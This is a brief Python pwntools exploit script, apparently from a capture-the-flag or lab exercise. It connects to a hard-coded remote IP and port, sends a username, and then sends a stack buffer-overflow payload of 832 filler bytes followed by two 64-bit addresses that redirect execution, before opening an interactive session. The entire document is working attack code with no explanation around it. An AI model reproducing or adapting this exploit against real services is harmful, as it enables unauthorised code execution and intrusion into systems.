from pwn import *

conn = remote("104.199.235.135", 2111)

conn.recvuntil(':')

conn.sendline('yichin')

conn.recvuntil(':')

payload = "A" * 832 + p64(0x4008a0) + p64(0x0000000000400796)

conn.sendline(payload)

conn.interactive()
